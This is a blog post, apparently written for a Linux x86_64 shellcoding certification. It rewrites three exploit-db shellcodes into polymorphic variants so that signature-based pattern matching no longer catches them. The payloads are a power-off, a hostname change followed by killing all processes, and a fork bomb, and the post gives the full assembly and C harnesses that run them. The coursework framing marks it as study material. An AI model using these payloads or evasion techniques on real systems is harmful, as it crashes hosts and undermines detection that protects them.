---
layout: single
title: Polymorphic Shellcode - Linux x86_64
date: 2018-7-25
classes: wide
header:
  teaser: /assets/images/
---

Introduction
------------
In general polymorphism mean the ability to appear in many forms, it’s also referred to as a feature of object-oriented programing in computer science. In this post we will take three sample shellcodes off of exploit-db and mutate them in order to beat pattern matching. The final shellcode size should be less or equal to 150% of the original shellcode. Please refer to my SLAE32 series to learn more about polymorphism.

Shellcode I
-----------
In the first [shellcode](https://www.exploit-db.com/exploits/13688/) we’ll look at issuing power off command via `reboot()` function and its 19 bytes in size which means we have up to 28 bytes of space.

```nasm
# Linux/x86_64 reboot(POWER_OFF) 19 bytes shellcode
# Date: 2010-04-25
# Author: zbt
# Tested on: x86_64 Debian GNU/Linux


/*
    ; reboot(LINUX_REBOOT_MAGIC1, LINUX_REBOOT_MAGIC2,
LINUX_REBOOT_CMD_POWER_OFF)

    section .text
        global _start

    _start:
        mov     edx, 0x4321fedc
        mov     esi, 0x28121969
        mov     edi, 0xfee1dead
        mov     al,  0xa9
        syscall
*/
int main(void)
{
    char reboot[] =
    "\xba\xdc\xfe\x21\x43"  // mov    $0x4321fedc,%edx
    "\xbe\x69\x19\x12\x28"  // mov    $0x28121969,%esi
    "\xbf\xad\xde\xe1\xfe"  // mov    $0xfee1dead,%edi
    "\xb0\xa9"              // mov    $0xa9,%al
    "\x0f\x05";             // syscall

    (*(void (*)()) reboot)();

    return 0;
}
```

The following is the final polymorphic shellcode with a size of 27 bytes.

```nasm
; int reboot(int magic, int magic2, int cmd, void *arg)
; rax=169, rdi=0xfee1dead, rsi=0x28121969, rdx=0x4321fedc

global _start

section .text

_start:
	add al, 0xa9
	mov edi, 0x7F70EF56
	shl rdi, 0x1
	inc edi
	mov edx, 0x28121969
	mov esi, 0x4321fedc
	xchg rdx, rsi
	syscall
```

Shellcode II
------------
In the second [shellcode](https://www.exploit-db.com/exploits/43607/) we’re going to play with changing the hostname to `Rooted !` via `sethostname()` function and then terminate every process for which the calling process has permission to send signals to using `kill()` function. The original shellcode size is 33 bytes which leave us with 49 bytes.

```nasm
# Linux/x86_64 sethostname() & killall 33 bytes shellcode
# Date: 2010-04-26
# Author: zbt
# Tested on: x86_64 Debian GNU/Linux
 
 
/*
    ; sethostname("Rooted !");
    ; kill(-1, SIGKILL);
 
 
    section .text
        global _start
 
    _start:
 
        ;-- setHostName("Rooted !"); 22 bytes --;
        mov     al, 0xaa
        mov     r8, 'Rooted !'
        push    r8
        mov     rdi, rsp
        mov     sil, 0x8
        syscall
 
        ;-- kill(-1, SIGKILL); 11 bytes --;
        push    byte 0x3e
        pop     rax
        push    byte 0xff
        pop     rdi
        push    byte 0x9
        pop     rsi
        syscall
*/
int main(void)
{
    char shellcode[] =
    "\xb0\xaa\x49\xb8\x52\x6f\x6f\x74\x65\x64\x20\x21\x41\x50\x48\x89"
    "\xe7\x40\xb6\x08\x0f\x05\x6a\x3e\x58\x6a\xff\x5f\x6a\x09\x5e\x0f\x05";
 
    (*(void (*)()) shellcode)();
 
    return 0;
}
```

The final shellcode size is 38 bytes.

```nasm
global _start

section .text

_start:
	; int sethostname(const char *name, size_t len)
	; rax=170, rdi="Rooted !", rsi=8
	add al, 170
	mov rbx, 0xDEDF9B9A8B9090AD
	not rbx
	push rbx
	push rsp
	pop rdi
	push byte 0x9
	pop rsi
	dec esi
	syscall

	; int kill(pid_t pid, int sig)
	; rax=62, rdi=-1, rsi=9
	push 62
	pop rax
	push r15
	pop rdi
	dec rdi
	inc esi
	syscall
```

Shellcode III
-------------
The last [shellcode](https://www.exploit-db.com/exploits/42523/) generates infinite child processes using `fork()` function which will effectively render the system unavailable. The original shellcode size is 11 bytes meaning we need to stay below 16 bytes.

```nasm
/*
;Title: Linux/x86_64 - fork() Bomb (11 bytes)
;Author: Touhid M.Shaikh
;Contact: https://twitter.com/touhidshaikh
;Category: Shellcode
;Architecture: Linux x86_64
;Description: WARNING! this shellcode may crash your computer if executed
in your system.
;Shellcode Length: 11
;Tested on : Debian 4.6.4-1kali1 (2016-07-21) x86_64 GNU/Linux



===COMPILATION AND EXECUTION Assemmbly file===

#nasm -f elf64 shell.asm -o shell.o <=== Making Object File

#ld shell.o -o shell <=== Making Binary File

#./bin2shell.sh shell <== xtract hex code from the binary(
https://github.com/touhidshaikh/bin2shell)

=================SHELLCODE(INTEL FORMAT)=================

section .text
    global _start:
_start:
    xor rax,rax
    add rax,57
    syscall
    jmp _start

===================END HERE============================

====================FOR C Compile===========================

Compile with gcc with some options.

# gcc -fno-stack-protector -z execstack shell-testing.c -o shell-testing

*/

#include<stdio.h>
#include<string.h>


unsigned char code[] = "\x48\x31\xc0\x48\x83\xc0\x39\x0f\x05\xeb\xf5";

main()
{

printf("Shellcode Length:  %d\n", (int)strlen(code));

int (*ret)() = (int(*)())code;

ret();

}

/*More Shellcode => Download Link :
https://github.com/touhidshaikh/shellcode/tree/master/Linux */
```

I was able to shrink down the final shellcode size to 7 bytes which is 4 bytes less than the original. Defiantly an improvement compared to the other two.

```nasm
global _start

section .text

_start:
	; pid_t fork(void)
	; rax=57
	push 0x39
	pop rax
	syscall
	jnz _start
```

Closing Thoughts
----------------
This post was a good opportunity for me to explore new functions that might come in handy in the future. All of the above code are available on my [github](https://github.com/ihack4falafel/SLAE64/tree/master/Assignment%206). Feel free to contact me for questions via Twitter [@ihack4falafel](https://twitter.com/ihack4falafel).

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certiﬁcation:

[http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html](http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html)

Student ID: SLAE64–1579
